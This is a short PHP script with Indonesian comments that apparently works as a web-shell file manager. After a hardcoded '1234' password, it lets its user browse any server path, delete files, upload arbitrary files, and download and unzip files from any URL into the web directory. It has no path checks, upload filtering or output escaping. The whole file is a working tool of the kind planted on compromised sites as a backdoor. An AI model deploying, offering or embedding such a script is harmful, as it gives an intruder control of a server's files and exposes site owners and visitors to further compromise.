<?php
session_start();

/* =======================
   LOGIN SEDERHANA
======================= */
$password = '1234'; // ganti sendiri

if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: ?");
        exit;
    }
    echo '<form method="POST">
        <input type="password" name="pass" placeholder="Password">
        <button>Login</button>
    </form>';
    exit;
}

/* =======================
   DOWNLOAD & UNZIP
======================= */
function downloadAndUnzip($url, $dir) {
    $fileName = basename(parse_url($url, PHP_URL_PATH));
    $filePath = $dir . '/' . $fileName;

    $data = @file_get_contents($url);
    if ($data === false) return "gagal mengunduh";

    file_put_contents($filePath, $data);

    if (strtolower(pathinfo($filePath, PATHINFO_EXTENSION)) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($filePath) === TRUE) {
            $zip->extractTo($dir);
            $zip->close();
            unlink($filePath);
            return "berhasil (zip diekstrak)";
        } else {
            return "gagal ekstrak zip";
        }
    }
    return "berhasil (file biasa)";
}

/* =======================
   FILE MANAGER
======================= */
$path = isset($_GET['d']) ? $_GET['d'] : getcwd();
if (!is_dir($path)) $path = getcwd();

/* DELETE */
if (isset($_GET['del'])) {
    $t = $_GET['del'];
    if (is_file($t)) @unlink($t);
    elseif (is_dir($t)) @rmdir($t);
    header("Location: ?d=" . urlencode($path));
    exit;
}

/* UPLOAD */
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name']);
    header("Location: ?d=" . urlencode($path));
    exit;
}

/* DOWNLOAD VIA URL */
$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_url'])) {
    $msg = downloadAndUnzip($_POST['file_url'], $path);
}

/* =======================
   OUTPUT
======================= */
echo "<h3>File Manager: $path</h3>";

echo '<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <button>Upload</button>
</form><br>';

echo '<form method="POST">
    <input type="text" name="file_url" placeholder="link file / zip" style="width:250px;" required>
    <button>Download</button>
</form>';

if ($msg) echo "<p><b>$msg</b></p>";

echo '<ul>';
$files = scandir($path);
foreach ($files as $f) {
    if ($f == '.') continue;
    $fp = "$path/$f";
    echo "<li>";
    if (is_dir($fp)) {
        echo "[DIR] <a href='?d=" . urlencode($fp) . "'>$f</a>";
    } else {
        echo "[FILE] <a href='$fp'>$f</a>";
    }
    echo " <a href='?d=" . urlencode($path) . "&del=" . urlencode($fp) . "' onclick='return confirm(\"Delete?\")'>[x]</a></li>";
}
echo '</ul>';
?>